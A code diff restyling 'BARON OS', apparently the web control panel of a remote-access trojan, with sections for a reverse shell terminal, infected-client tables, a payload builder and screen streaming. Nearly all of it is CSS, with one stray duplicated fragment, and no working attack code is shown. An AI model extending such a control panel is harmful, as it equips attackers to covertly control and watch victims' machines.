@@ -3,718 +3,1118 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BARON OS · V3</title>
-<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<title>BARON · SOVEREIGN EDITION</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <style>
-/* 
- * BARON OS V3 - "THE RICH BARON" 
- * Luxury Desktop Environment 
- */
+  :root {
+    --gold: #D4AF37; 
+    --gold-dim: color-mix(in srgb, var(--gold) 18%, transparent);
+    --gold-glow: color-mix(in srgb, var(--gold) 35%, transparent);
+    --bg0: #020205; --bg1: rgba(5,5,10,.80); --bg2: rgba(10,10,18,.7);
+    --surface: rgba(12,12,20,.6); --border: color-mix(in srgb, var(--gold) 15%, transparent);
+    --text: #ffffff; --text-dim: rgba(255,255,255,.6);
+    --green: #2de076; --red: #ff4a6b; --blue: #5b9fff;
+    --mono: 'JetBrains Mono', monospace; --sans: 'Outfit', sans-serif;
+    --radius: 20px; --blur: 40px; /* Увеличен blur для сильного эффекта матового стекла */
+    --transition-slow: all 0.7s cubic-bezier(0.16, 1, 0.3, 1);
+  }
+  
+  /* Theming Override from LocalStorage */
+  :root[data-theme="sapphire"] { --gold: #2f80ed; }
+  :root[data-theme="emerald"] { --gold: #2ed573; }
+  :root[data-theme="amethyst"] { --gold: #9b59b6; }
+  :root[data-theme="ruby"] { --gold: #ff4757; }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%;overflow:hidden;font-family:var(--sans);background:var(--bg0);color:var(--text)}
+  ::-webkit-scrollbar{width:4px} ::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
 
-:root {
-  --bg-color: #050505;
-  --panel-bg: rgba(15, 15, 15, 0.65);
-  --border-color: rgba(255, 215, 0, 0.15); /* Subtle Gold border */
-  --highlight: #d4af37; /* Metallic Gold */
-  --text-main: #f5f5f5;
-  --text-dim: #a0a0a0;
-  --danger: #b91c1c;
-  --success: #15803d;
-  --glass-blur: blur(24px);
-  --shadow-gold: 0 4px 30px rgba(212, 175, 55, 0.1);
-  --shadow-window: 0 20px 50px rgba(0,0,0,0.8), 0 0 0 1px var(--border-color);
-  --font-serif: 'Playfair Display', serif;
-  --font-sans: 'Inter', sans-serif;
-  --font-mono: 'JetBrains Mono', monospace;
-  --z-desktop: 1;
-  --z-dock: 1000;
-  --z-window: 100;
-  --z-modal: 9000;
-  --z-context: 9500;
-}
+  /* ─── Liquid Mesh Background ─── */
+  .canvas {
+    position: fixed; inset: 0; z-index: 0;
+    background: var(--bg0);
+    overflow: hidden;
+  }
+  .mesh-blob {
+    position: absolute;
+    filter: blur(120px);
+    border-radius: 50%;
+    opacity: 0.6;
+    animation: drift 20s infinite alternate cubic-bezier(0.4, 0, 0.2, 1);
+    mix-blend-mode: screen;
+  }
+  @keyframes drift {
+    0%   { transform: translate(0, 0) scale(1) rotate(0deg); }
+    50%  { transform: translate(15vw, 15vh) scale(1.1) rotate(180deg); }
+    100% { transform: translate(-10vw, -15vh) scale(0.9) rotate(360deg); }
+  }
+  .blob-1 {
+    width: 60vw; height: 60vw;
+    background: radial-gradient(circle, var(--gold-glow), transparent 70%);
+    top: -20vh; left: -20vw;
+    animation-duration: 25s;
+  }
+  .blob-2 {
+    width: 50vw; height: 50vw;
+    background: radial-gradient(circle, rgba(91,159,255,0.2), transparent 70%);
+    bottom: -20vh; right: -10vw;
+    animation-duration: 30s;
+    animation-delay: -5s;
+  }
+  .blob-3 {
+    width: 40vw; height: 40vw;
+    background: radial-gradient(circle, rgba(255,74,107,0.1), transparent 70%);
+    top: 30vh; left: 40vw;
+    animation-duration: 22s;
+    animation-delay: -10s;
+  }
+  .glass-overlay {
+    position: absolute; inset: 0;
+    backdrop-filter: blur(80px) saturate(180%);
+    z-index: 1;
+  }
 
-* { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
+  /* ─── Login ─── */
+  #login{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;transition:opacity .7s ease}
+  .login-wrap{width:400px;animation:fadeUp .6s ease}
+  .login-card{background:var(--bg1);backdrop-filter:blur(var(--blur));border:1px solid var(--border);border-radius:24px;padding:48px 40px;text-align:center;
+    box-shadow:0 0 60px rgba(212,175,55,.05),0 30px 60px rgba(0,0,0,.6)}
+  .login-logo{font-size:2.6rem;font-weight:900;letter-spacing:10px;
+    background:linear-gradient(135deg,#fff 30%,var(--gold));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+  .login-sub{font-size:.7rem;letter-spacing:4px;color:var(--gold);opacity:.7;text-transform:uppercase;margin-bottom:36px}
+  .inp{width:100%;padding:14px 18px;margin:8px 0;background:rgba(255,255,255,.04);border:1px solid var(--border);
+    border-radius:12px;color:var(--text);font-size:.95rem;font-family:var(--sans);outline:none;transition:.3s}
+  .inp:focus{border-color:var(--gold);box-shadow:0 0 0 3px var(--gold-dim)}
+  .btn-login{width:100%;padding:15px;margin-top:20px;background:linear-gradient(135deg,var(--gold),#b8871e);
+    color:#000;font-weight:800;font-size:1rem;letter-spacing:2px;border:none;border-radius:12px;cursor:pointer;transition:.3s;font-family:var(--sans)}
+  .btn-login:hover{transform:translateY(-2px);box-shadow:0 8px 30px var(--gold-glow)}
+  .err{color:var(--red);font-size:.85rem;margin-top:14px;min-height:20px}
 
-body {
-  background-color: var(--bg-color);
-  color: var(--text-main);
-  font-family: var(--font-sans);
-  overflow: hidden; /* OS environment, no global scrolling */
-  width: 100vw; height: 100vh;
-}
+  /* ─── Layout ─── */
+  #shell{display:none;grid-template-columns:260px 1fr;height:100vh;position:relative;z-index:1}
 
-/* Luxury Animated Background */
-#os-background {
-  position: absolute; top:0; left:0; width:100%; height:100%; z-index: 0;
-  background: radial-gradient(circle at 50% 50%, #1a1608 0%, #050505 100%);
-  overflow: hidden;
-}
-.gold-orb {
-  position: absolute; border-radius: 50%; filter: blur(100px);
-  background: rgba(212, 175, 55, 0.15);
-  animation: floatOrb 20s infinite alternate cubic-bezier(0.4, 0, 0.2, 1);
-}
-@keyframes floatOrb {
-  0% { transform: translate(0, 0) scale(1); }
-  100% { transform: translate(100px, -50px) scale(1.5); }
-}
+  /* ─── Sidebar ─── */
+  .sidebar{background:rgba(6,6,14,.95);backdrop-filter:blur(40px);border-right:1px solid var(--border);
+    display:flex;flex-direction:column;gap:0;padding:0;overflow:hidden}
+  .sbar-top{padding:32px 24px 24px;border-bottom:1px solid var(--border)}
+  .sbar-logo{font-size:1.7rem;font-weight:900;letter-spacing:8px;
+    background:linear-gradient(135deg,#fff,var(--gold));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+  .sbar-ver{font-size:.65rem;color:var(--gold);letter-spacing:2px;opacity:.6;margin-top:2px}
+  .sbar-status{display:flex;align-items:center;gap:8px;margin-top:16px;
+    font-size:.75rem;color:var(--text-dim);font-family:var(--mono)}
+  .dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s infinite}
 
-/* Scrollbars */
-::-webkit-scrollbar { width: 6px; height: 6px; }
-::-webkit-scrollbar-track { background: transparent; }
-::-webkit-scrollbar-thumb { background: rgba(212,175,55,0.3); border-radius: 3px; }
-::-webkit-scrollbar-thumb:hover { background: rgba(212,175,55,0.6); }
+  .nav{flex:1;padding:16px 12px;overflow-y:auto;display:flex;flex-direction:column;gap:4px}
+  .nav-label{font-size:.6rem;letter-spacing:3px;color:var(--text-dim);padding:12px 12px 6px;text-transform:uppercase}
+  .nav-item{padding:11px 14px;border-radius:10px;cursor:pointer;transition:.25s;
+    display:flex;align-items:center;gap:12px;color:var(--text-dim);font-size:.88rem;border:1px solid transparent}
+  .nav-item svg{width:16px;height:16px;flex-shrink:0}
+  .nav-item:hover{background:var(--gold-dim);color:var(--text);border-color:var(--border)}
+  .nav-item.active{background:var(--gold-dim);color:var(--gold);border-color:var(--gold-glow);
+    box-shadow:inset 0 0 20px var(--gold-dim),0 0 15px rgba(212,175,55,.05)}
 
-/* UI Primitives */
-input, select, button, textarea {
-  background: rgba(0,0,0,0.4); border: 1px solid var(--border-color);
-  color: var(--text-main); font-family: var(--font-sans); padding: 8px 12px;
-  border-radius: 6px; outline: none; transition: all 0.2s; user-select: text;
-}
-input:focus, select:focus, textarea:focus { border-color: var(--highlight); box-shadow: 0 0 10px rgba(212,175,55,0.2); }
-button { cursor: pointer; text-transform: uppercase; font-size: 0.8rem; font-weight: 600; letter-spacing: 1px; }
-button:hover { background: rgba(212,175,55,0.15); border-color: var(--highlight); }
-button.gold-btn { background: rgba(212,175,55,0.2); border-color: var(--highlight); color: #fff; }
-button.gold-btn:hover { background: rgba(212,175,55,0.4); box-shadow: 0 0 15px rgba(212,175,55,0.4); }
+  .sbar-bot{padding:16px 12px;border-top:1px solid var(--border)}
+  .usr-card{padding:12px 14px;border-radius:10px;background:var(--gold-dim);border:1px solid var(--border);
+    display:flex;align-items:center;gap:10px}
+  .usr-av{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,var(--gold),#8b6914);
+    display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.8rem;color:#000}
+  .usr-name{font-size:.85rem;font-weight:600}
+  .usr-role{font-size:.7rem;color:var(--gold);opacity:.8}
+  .btn-logout{width:100%;margin-top:8px;padding:9px;background:rgba(255,74,107,.1);border:1px solid rgba(255,74,107,.2);
+    color:var(--red);border-radius:8px;cursor:pointer;font-size:.8rem;transition:.2s;font-family:var(--sans)}
+  .btn-logout:hover{background:rgba(255,74,107,.2)}
 
-/* --- LOGIN SCREEN --- */
-#login-screen {
-  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-  display: flex; justify-content: center; align-items: center;
-  z-index: var(--z-modal);
-  background: var(--bg-color);
-  transition: opacity 0.8s;
-}
-.login-box {
-  background: var(--panel-bg); backdrop-filter: var(--glass-blur);
-  padding: 50px; border-radius: 12px; box-shadow: var(--shadow-window);
-  text-align: center; width: 400px;
-}
-.login-box h1 { font-family: var(--font-serif); color: var(--highlight); font-size: 2.5rem; margin-bottom: 30px; letter-spacing: 2px; }
-.login-box input { width: 100%; margin-bottom: 20px; font-size: 1.1rem; padding: 12px; }
-.login-box button { width: 100%; padding: 12px; font-size: 1rem; }
+  /* ─── Main ─── */
+  .main{display:flex;flex-direction:column;overflow:hidden}
+  /* ─── Sovereign Island (Dynamic Top Bar) ─── */
+  .sovereign-wrapper {
+    position: absolute; top: 16px; left: 0; right: 0;
+    display: flex; justify-content: center; z-index: 50;
+    pointer-events: none;
+  }
+  .sovereign-island {
+    background: #000;
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 40px;
+    height: 48px; min-width: 260px; padding: 0 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    transition: var(--transition-slow);
+    pointer-events: auto;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8), inset 0 0 15px rgba(255,255,255,0.02);
+    overflow: hidden; cursor: pointer;
+  }
+  .sovereign-island:hover { transform: scale(1.02); }
+  .sovereign-island.expanded { 
+    height: 64px; min-width: 450px; border-radius: 32px; 
+    background: rgba(10,10,18,0.95); backdrop-filter: blur(20px); 
+    border-color: var(--gold-dim); 
+  }
+  
+  .isl-left { display: flex; align-items: center; gap: 12px; }
+  .isl-center { 
+    flex: 1; text-align: center; overflow: hidden; white-space: nowrap; 
+    color: var(--gold); font-size: 0.8rem; font-weight: 500; 
+    opacity: 0; transition: 0.4s; padding: 0 10px;
+  }
+  .sovereign-island.expanded .isl-center { opacity: 1; }
+  .isl-right { display: flex; align-items: center; gap: 12px; }
+  
+  .theme-picker { display: flex; gap: 6px; }
+  .theme-dot { 
+    width: 14px; height: 14px; border-radius: 50%; cursor: pointer; 
+    transition: 0.2s; border: 1px solid rgba(255,255,255,0.1); 
+  }
+  .theme-dot:hover { transform: scale(1.3); }
 
-/* --- OS DOCK / TASKBAR --- */
-#os-dock {
-  position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%);
-  background: rgba(10,10,10,0.7); backdrop-filter: var(--glass-blur);
-  border: 1px solid var(--border-color); border-radius: 16px;
-  display: flex; padding: 8px 16px; gap: 16px; z-index: var(--z-dock);
-  box-shadow: var(--shadow-gold);
-}
-.dock-item {
-  width: 48px; height: 48px; border-radius: 12px; display: flex;
-  justify-content: center; align-items: center; color: var(--text-dim);
-  font-size: 1.2rem; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-  position: relative;
-}
-.dock-item:hover { color: var(--highlight); transform: translateY(-8px) scale(1.1); background: rgba(212,175,55,0.1); }
-.dock-item::after { 
-  content: attr(data-tooltip); position: absolute; top: -35px; left: 50%; transform: translateX(-50%);
-  background: rgba(0,0,0,0.8); color: #fff; padding: 4px 8px; border-radius: 4px; border: 1px solid var(--border-color);
-  font-size: 0.75rem; white-space: nowrap; opacity: 0; pointer-events: none; transition: opacity 0.2s; font-family: var(--font-sans);
-}
-.dock-item:hover::after { opacity: 1; }
+  .pg-title{font-size:1.1rem;font-weight:700}
+  .time-chip{font-family:var(--mono);font-size:.75rem;color:var(--text);
+    background:rgba(255,255,255,0.05);padding:4px 10px;border-radius:20px}
 
-.dock-separator { width: 1px; background: var(--border-color); margin: 0 8px; }
+  .content{flex:1;overflow-y:auto;padding:32px 36px;display:flex;flex-direction:column;gap:32px}
 
-/* Desktop Env */
-#os-desktop { position: absolute; top:0; left:0; width:100%; height:100%; z-index: var(--z-desktop); }
+  /* ─── Liquid Glass Cards ─── */
+  .card{
+    background: linear-gradient(135deg, rgba(255,255,255,0.03) 0%, rgba(255,255,255,0) 100%), var(--surface);
+    backdrop-filter: blur(var(--blur)) saturate(180%);
+    border: 1px solid rgba(255,255,255,0.06); border-top: 1px solid rgba(255,255,255,0.15);
+    border-radius: var(--radius); transition: var(--transition-slow);
+    box-shadow: 0 16px 40px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
+  }
+  .card:hover{
+    border-color: rgba(212,175,55,.2);
+    box-shadow: 0 20px 50px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.2), 0 0 40px var(--gold-dim);
+    transform: translateY(-2px);
+  }
+  .card-head{padding:20px 24px;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:space-between}
+  .card-title{font-size:.9rem;font-weight:600;letter-spacing:.5px; text-shadow: 0 2px 10px rgba(0,0,0,0.5);}
+  .card-badge{font-size:.7rem;padding:4px 10px;border-radius:20px;font-family:var(--mono)}
+  .card-body{padding:24px}
 
-/* --- WINDOW MANAGER --- */
-.os-window {
-  position: absolute; background: rgba(12, 12, 12, 0.85);
-  backdrop-filter: blur(30px); border: 1px solid var(--border-color);
-  border-radius: 10px; box-shadow: var(--shadow-window);
-  display: flex; flex-direction: column; overflow: hidden;
-  min-width: 300px; min-height: 200px;
-  animation: windowOpen 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-}
-@keyframes windowOpen {
-  0% { transform: scale(0.95); opacity: 0; }
-  100% { transform: scale(1); opacity: 1; }
-}
+  /* ─── Stats ─── */
+  .stats-grid{display:grid;grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));gap:24px}
+  .stat{
+    padding:24px;border-radius:var(--radius);
+    background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0) 100%), var(--surface);
+    backdrop-filter: blur(40px) saturate(200%);
+    border: 1px solid rgba(255,255,255,0.08); border-top: 1px solid rgba(255,255,255,0.18);
+    position:relative;overflow:hidden;transition:var(--transition-slow);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
+    cursor: grab;
+  }
+  .stat:active { cursor: grabbing; transform: scale(0.96); }
+  .stat:hover{
+    transform:translateY(-6px) scale(1.02);
+    border-color:rgba(212,175,55,.4);
+    box-shadow: 0 20px 40px rgba(0,0,0,0.7), 0 0 30px var(--gold-dim);
+  }
+  .stat::before{content:'';position:absolute;top:-40px;right:-40px;width:120px;height:120px;border-radius:50%;
+    background:radial-gradient(circle, var(--gold-glow),transparent); opacity: 0.5; transition: 0.8s;}
+  .stat:hover::before { transform: scale(1.5); opacity: 1; }
+  .stat-label{font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--gold);margin-bottom:10px; font-weight:600;}
+  .stat-val{font-size:3rem;font-weight:800;line-height:1;color:#fff; text-shadow: 0 4px 20px rgba(255,255,255,0.2);}
+  .stat-hint{font-size:.75rem;color:var(--text-dim);margin-top:8px;font-family:var(--mono)}
 
-.os-window.active { border-color: rgba(212,175,55,0.4); box-shadow: 0 0 40px rgba(212,175,55,0.15); }
+  /* ─── Table ─── */
+  .tbl-wrap{overflow-x:auto}
+  table{width:100%;border-collapse:collapse}
+  th{padding:12px 16px;text-align:left;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--gold);border-bottom:1px solid var(--border)}
+  td{padding:16px 16px;border-bottom:1px solid rgba(255,255,255,.04);font-size:.85rem;vertical-align:middle}
+  tr:last-child td{border:none}
+  tr:hover td{background:rgba(255,255,255,.02)}
+  .pill{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;font-size:.72rem;font-family:var(--mono)}
+  .pill-green{background:rgba(45,224,118,.12);color:var(--green);border:1px solid rgba(45,224,118,.2)}
+  .pill-red{background:rgba(255,74,107,.12);color:var(--red);border:1px solid rgba(255,74,107,.2)}
+  .pill-dot{width:5px;height:5px;border-radius:50%;background:currentColor}
+  .cid{font-family:var(--mono);font-size:.75rem;color:var(--text-dim)}
 
-.os-titlebar {
-  background: rgba(0,0,0,0.5); padding: 8px 12px; display: flex; align-items: center; justify-content: space-between;
-  cursor: grab; border-bottom: 1px solid rgba(255,255,255,0.05); user-select: none;
-}
-.os-titlebar:active { cursor: grabbing; }
-.os-title { font-family: var(--font-serif); font-size: 0.95rem; color: var(--highlight); letter-spacing: 1px; }
-.os-controls { display: flex; gap: 8px; }
-.os-btn { width: 14px; height: 14px; border-radius: 50%; cursor: pointer; transition: 0.2s; border: none; }
-.btn-close { background: #ed6a5e; }
-.btn-close:hover { background: #f04333; }
-.btn-max { background: #f4be4f; }
-.btn-max:hover { background: #e0a322; }
+  /* ─── Btn & Inputs (Liquid Glass) ─── */
+  .btn{
+    padding:10px 22px;border-radius:12px;cursor:pointer;font-size:.85rem;font-family:var(--sans);
+    border:1px solid transparent;transition:var(--transition-slow);font-weight:600;
+    backdrop-filter: blur(10px);
+  }
+  .btn-gold{
+    background: linear-gradient(135deg, var(--gold), color-mix(in srgb, var(--gold) 60%, black));
+    color:#000;border:none; box-shadow: 0 4px 15px var(--gold-dim), inset 0 1px 0 rgba(255,255,255,0.4);
+  }
+  .btn-gold:hover{
+    box-shadow:0 8px 25px var(--gold-glow), inset 0 1px 0 rgba(255,255,255,0.6);
+    transform:translateY(-2px) scale(1.03);
+  }
+  .btn-gold:active{ transform: scale(0.95); }
+  
+  .btn-outline{background:rgba(255,255,255,0.03);border: 1px solid rgba(255,255,255,0.1);color:var(--text);}
+  .btn-outline:hover{background:rgba(255,255,255,0.08);border-color:var(--gold);color:#fff; transform: translateY(-2px);}
+  .btn-red{background:rgba(255,74,107,.15);border-color:rgba(255,74,107,.3);color:var(--red)}
+  .btn-red:hover{background:rgba(255,74,107,.3); box-shadow: 0 0 20px rgba(255,74,107, 0.4);}
+  .btn-sm{padding:6px 14px;font-size:.75rem}
 
-.os-content { flex: 1; position: relative; overflow: auto; padding: 16px; }
+  /* ─── Terminal ─── */
+  .terminal{background:#000;border:1px solid var(--border);border-radius:10px;
+    font-family:var(--mono);font-size:.78rem;overflow:hidden}
+  .term-bar{padding:10px 16px;background:rgba(255,255,255,.04);border-bottom:1px solid var(--border);
+    display:flex;align-items:center;gap:8px}
+  .term-dot{width:10px;height:10px;border-radius:50%}
 
-/* Resizer */
-.os-resize { position: absolute; right: 0; bottom: 0; width: 15px; height: 15px; cursor: se-resize; z-index: 10; }
+  /* ─── Context Menu ─── */
+  #ctx-menu {
+    position: fixed; z-index: 9999; background: var(--bg1); backdrop-filter: blur(var(--blur));
+    border: 1px solid var(--border); border-radius: 12px; min-width: 220px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8), 0 0 15px rgba(212,175,55,0.1); display: none;
+    flex-direction: column; padding: 8px; overflow: hidden;
+  }
+  #ctx-menu.show { display: flex; animation: fadeUp .2s ease }
+  .ctx-item {
+    padding: 10px 16px; font-size: .85rem; color: var(--text); border-radius: 6px;
+    cursor: pointer; display: flex; align-items: center; gap: 8px; transition: .2s;
+  }
+  .ctx-item:hover { background: var(--gold-dim); color: var(--gold); }
+  .ctx-item.danger { color: var(--red); }
+  .ctx-item.danger:hover { background: rgba(255,74,107,.15); }
+  .ctx-divider { height: 1px; background: rgba(255,255,255,.05); margin: 6px 0; }
+  .ctx-header { padding: 8px 16px; font-size: .7rem; letter-spacing: 2px; text-transform: uppercase; color: var(--text-dim); }
 
-/* --- SPECIFIC APP CONTENT --- */
+    display:flex;align-items:center;gap:8px}
+  .term-dot{width:10px;height:10px;border-radius:50%}
+  .term-body{padding:14px 18px;height:220px;overflow-y:auto;color:#a0f0a0;line-height:1.7}
+  .term-inp-row{display:flex;align-items:center;gap:0;padding:8px 18px;border-top:1px solid var(--border)}
+  .term-prompt{color:var(--gold);white-space:nowrap;font-family:var(--mono)}
+  .term-inp{flex:1;background:none;border:none;outline:none;color:#fff;font-family:var(--mono);font-size:.78rem;padding:0 10px}
 
-/* Network (Clients Table) */
-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
-th, td { text-align: left; padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); }
-th { color: var(--text-dim); text-transform: uppercase; font-size: 0.75rem; letter-spacing: 1px; }
-tr:hover { background: rgba(255,255,255,0.02); }
-.agent-row { cursor: context-menu; transition: background 0.2s; }
-.status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: var(--success); box-shadow: 0 0 8px var(--success); margin-right: 8px; }
-.status-dot.offline { background: var(--danger); box-shadow: 0 0 8px var(--danger); }
+  /* ─── Builder ─── */
+  .builder-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+  .form-group{margin-bottom:16px}
+  .form-label{display:block;font-size:.72rem;letter-spacing:2px;color:var(--gold);text-transform:uppercase;margin-bottom:8px}
+  .form-input{width:100%;padding:11px 14px;background:rgba(255,255,255,.04);border:1px solid var(--border);
+    border-radius:8px;color:var(--text);font-size:.88rem;outline:none;transition:.25s;font-family:var(--sans)}
+  .form-input:focus{border-color:var(--gold);box-shadow:0 0 0 3px var(--gold-dim)}
+  .form-select{width:100%;padding:11px 14px;background:rgba(8,8,18,.9);border:1px solid var(--border);
+    border-radius:8px;color:var(--text);font-size:.88rem;outline:none;cursor:pointer;font-family:var(--sans)}
+  .toggle-row{display:flex;align-items:center;justify-content:space-between;
+    padding:12px 0;border-bottom:1px solid rgba(255,255,255,.05)}
+  .toggle-label{font-size:.85rem}
+  .toggle-sub{font-size:.72rem;color:var(--text-dim);margin-top:2px}
+  input[type=checkbox]{accent-color:var(--gold);width:16px;height:16px;cursor:pointer}
 
-/* Builder */
-.builder-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-.builder-section { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05); }
-.builder-section h3 { margin-bottom: 15px; color: var(--highlight); font-family: var(--font-serif); }
-.b-row { display: flex; flex-direction: column; gap: 5px; margin-bottom: 15px; }
-.b-row label { font-size: 0.8rem; color: var(--text-dim); }
+  /* ─── Log ─── */
+  .log-entry{display:flex;gap:14px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.03);align-items:flex-start}
+  .log-time{font-family:var(--mono);font-size:.72rem;color:var(--text-dim);white-space:nowrap;padding-top:1px}
+  .log-msg{font-size:.83rem;line-height:1.5}
+  .log-info .log-msg{color:var(--text)}
+  .log-warn .log-msg{color:#ffd26e}
+  .log-error .log-msg{color:var(--red)}
 
-/* Telemetry (Logs) */
-.log-line { font-family: var(--font-mono); font-size: 0.8rem; padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.02); display: flex; gap: 10px; }
-.log-time { color: var(--highlight); }
-.log-info { color: #60a5fa; }
-.log-warn { color: #fbbf24; }
-.log-err { color: #ef4444; }
-.log-cmd { color: #a78bfa; }
+  /* ─── Alert ─── */
+  .alert-banner{color:var(--red);background:rgba(255,74,107,.08);border:1px solid rgba(255,74,107,.2);
+    border-radius:10px;padding:14px 18px;display:flex;align-items:center;gap:12px;margin-bottom:16px;font-size:.85rem}
 
-/* Reverse Shell */
-.term-container { background: #000; padding: 10px; border-radius: 6px; font-family: var(--font-mono); font-size: 0.85rem; height: 100%; display: flex; flex-direction: column; border: 1px solid rgba(255,255,255,0.1); }
-.term-output { flex:1; overflow-y: auto; color: #0f0; white-space: pre-wrap; margin-bottom: 10px; }
-.term-input { display: flex; align-items: center; }
-.term-input span { color: #0f0; margin-right: 8px; }
-.term-input input { flex:1; background: transparent; border: none; font-family: var(--font-mono); color: #fff; padding:0; outline:none; }
-.term-input input:focus { box-shadow: none; border:none; }
+  /* ─── Modal ─── */
+  #modal-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.75);backdrop-filter:blur(8px);
+    display:none;align-items:center;justify-content:center}
+  #modal-overlay.show{display:flex}
+  .modal{background:var(--bg1);border:1px solid var(--border);border-radius:20px;padding:32px;
+    width:560px;max-height:80vh;overflow-y:auto;box-shadow:0 30px 80px rgba(0,0,0,.8)}
+  .modal-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px}
+  .modal-title{font-size:1.1rem;font-weight:700}
+  .modal-close{background:none;border:none;color:var(--text-dim);font-size:1.5rem;cursor:pointer;line-height:1}
+  .modal-close:hover{color:var(--red)}
 
-/* Screen Stream */
-.stream-wrapper { display: flex; flex-direction: column; height: 100%; gap: 10px; align-items: center; justify-content: center; }
-.stream-obj { max-width: 100%; max-height: calc(100% - 40px); border: 1px solid var(--border-color); border-radius: 4px; }
-.stream-ctrl { display: flex; gap: 10px; }
+  /* ─── Pages ─── */
+  .page{display:none}
+  .page.active{display:flex;flex-direction:column;gap:24px}
 
-/* Context Menu */
-#ctx-menu { 
-  position: absolute; background: rgba(10,10,10,0.95); backdrop-filter: var(--glass-blur);
-  border: 1px solid var(--border-color); border-radius: 8px; padding: 5px 0;
-  box-shadow: var(--shadow-window); z-index: var(--z-context); display: none;
-  min-width: 200px;
-}
-.ctx-header { padding: 5px 15px 10px; border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 5px; font-family: var(--font-serif); color: var(--highlight); font-size: 0.85rem; }
-.ctx-category { padding: 5px 15px; font-size: 0.65rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; margin-top: 5px; }
-.ctx-item { padding: 8px 15px; font-size: 0.85rem; cursor: pointer; transition: 0.2s; display: flex; justify-content: space-between; align-items: center; user-select: none; }
-.ctx-item:hover { background: rgba(212,175,55,0.15); color: var(--highlight); }
-.ctx-item.danger:hover { background: rgba(220, 38, 38, 0.2); color: #ef4444; }
+  /* ─── Streams ─── */
+  .stream-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+  .stream-card{border-radius:14px;overflow:hidden;background:#000;border:1px solid var(--border);aspect-ratio:16/9;
+    display:flex;align-items:center;justify-content:center;position:relative;cursor:pointer}
+  .stream-card img{width:100%;height:100%;object-fit:contain}
+  .stream-placeholder{color:var(--text-dim);font-size:.85rem;text-align:center;padding:20px}
+  .stream-controls{position:absolute;bottom:10px;right:10px;display:flex;gap:6px}
 
-/* Dashboard Cards (WebTop version) */
-.dash-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
-.dash-card { background: rgba(0,0,0,0.4); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.3s; }
-.dash-card:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.5); border-color: var(--highlight); }
-.dash-val { font-size: 2.5rem; font-family: var(--font-serif); color: var(--highlight); margin-bottom: 5px; }
-.dash-lbl { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
-
+  @keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+  @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+  .spin{animation:spin 1s linear infinite}
 </style>
 </head>
 <body>
+<div class="canvas"></div>
+<div class="grid-bg"></div>
 
-  <div id="os-background">
-    <div class="gold-orb" style="width:50vw; height:50vw; top: -10vw; left: -10vw;"></div>
-    <div class="gold-orb" style="width:40vw; height:40vw; bottom: -5vw; right: -5vw; animation-direction: reverse; animation-duration: 25s;"></div>
-  </div>
-
-  <div id="login-screen">
-    <div class="login-box">
-      <h1>BARON OS</h1>
-      <input type="text" id="u" placeholder="Username" autocomplete="off">
-      <input type="password" id="p" placeholder="Password" autocomplete="off">
-      <button class="gold-btn" onclick="doLogin()">Authenticate</button>
-      <p id="login-err" style="color:var(--danger); margin-top:15px; font-size:0.85rem;"></p>
+<!-- LOGIN -->
+<div id="login">
+  <div class="login-wrap">
+    <div class="login-card">
